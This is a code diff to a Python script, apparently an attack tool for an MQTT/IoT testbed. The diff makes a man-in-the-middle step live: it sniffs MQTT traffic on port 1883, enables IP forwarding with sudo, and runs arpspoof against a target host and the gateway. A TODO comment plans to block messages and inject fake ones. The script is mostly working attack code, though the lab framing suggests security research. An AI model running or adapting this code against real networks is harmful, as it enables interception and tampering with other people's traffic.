@@ -131,16 +131,20 @@ def execute_attack(json_response):
         print("Perform phishing attack")
 
 def fake_data_transfer_attack():
+    #PERFORM PACKET SNIFFING:
+    #start_time = time.time()
+    print("Sniffing Packets...")
+    sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 10)
+    print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
+    
+    #MAN IN THE MIDDLE ATTACK:
     #Enables ip forwarding (hence passing on the packets we get)
     os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
     #Reroutes packets from the MQTT server through this computer.
-    #process = subprocess.Popen(["sudo", "arpspoof", "-i", "enp0s3", "-t", "192.168.1.15", "-r", "192.168.1.1"])
-    #start_time = time.time()
-    print("Starting to capture MQTT packets on port 1883 on the testbed")
-    sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 10)
-    print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
-    #process.terminate()
-    #TODO: Figure out how to terminate arpspoof, use identified topic to stop message from going through and send fake message.
+    process = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "-r", "192.168.1.1"])
+    time.sleep(10)
+    os.kill(process.pid, signal.SIGTERM)
+    #TODO: Use identified topic to stop message from going through and send fake message.
     
 client = mqtt.Client()
 
